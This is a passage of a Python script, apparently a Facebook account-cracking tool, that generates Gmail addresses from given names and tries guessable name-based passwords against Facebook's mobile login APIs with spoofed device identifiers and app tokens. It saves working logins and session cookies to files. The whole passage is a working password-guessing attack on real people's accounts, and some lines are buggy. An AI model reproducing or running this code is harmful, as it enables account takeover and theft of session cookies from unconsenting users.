		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python SHAKIR.py')

def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;37m example: ramzan, ali, sajjad, faizan\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com ')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		clear()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		clear()
		print(' [1] METHOD 1')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as ZEESHU:
			total = str(len(fo))
			clear()
			print(' Total ids : \033[1;32m'+total+f' ')
			print(' \033[1;37mThe process is running in the background')
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					ZEESHU.submit(ZEESHU4,ids,passlist)
				
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python SHAKIR.py')
#b-api method
#1method
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [ZEESHU-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				
				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_api(),
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [SHAKIR-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/SHAKIR-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [SHAKIR-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/SHAKIR-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/SHAKIR-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
		except Exception as e:
			pass
#m2
#b-graph method		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SHAKIR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = None
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua_api(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SHAKIR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SHAKIR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHAKIR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SHAKIR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SHAKIR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAKIR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SHAKIR-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass


#______ random_____#


#method4
def SHAKIR4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SHAKIR-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3130};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent': ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SHAKIR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
                                        open('/sdcard/SHAKIR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SHAKIR-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[1;33m [SHAKIR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAKIR-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass

try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
